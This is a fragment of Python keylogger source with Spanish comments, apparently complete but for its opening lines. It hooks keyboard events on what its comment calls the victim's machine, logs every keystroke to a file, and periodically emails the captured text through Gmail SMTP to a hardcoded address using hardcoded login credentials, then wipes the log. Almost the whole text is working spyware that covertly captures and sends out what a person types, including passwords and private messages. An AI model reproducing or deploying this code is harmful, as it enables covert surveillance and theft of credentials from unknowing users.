# Capturamos lo pulsado en el teclado de la victima .
def OnKeyboardEvent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    print('WindowName:', event.WindowName)
    print('Window:', event.Window)
    print('Key:', event.Key)
    logging.log(10, event.Key)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown= OnKeyboardEvent
hooks_manager.HookKeyboard()

# Envía la información a la dirección de email de nuestra elección
def EnviarEmail():
    with open (carpeta_destino, 'r+') as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data=f.read()
        data= data.replace('Space', ' ')
        data = data.replace('\n', '')
        data = 'Mensaje capturado a las: '+ fecha + '\n' + data
        print (data)
        crearEmail('pruebaKeyloggerCB@gmail.com', 'prueba123', 'pruebaKeyloggerCB@gmail.com', 'Nueva captura:' +fecha, data)
        f.seek(0)
        f.truncate()
# Creeamos el email 
def crearEmail(user, passw, recep,subj, body):
    import smtplib
    mailUser=user
    mailPass=passw
    From = user
    To = recep
    Subject= subj
    Txt=body

    email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)

    try:
        server=smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()
        print('Correo enviado con éxito!!')

    except:
        print('Correo fallido :(')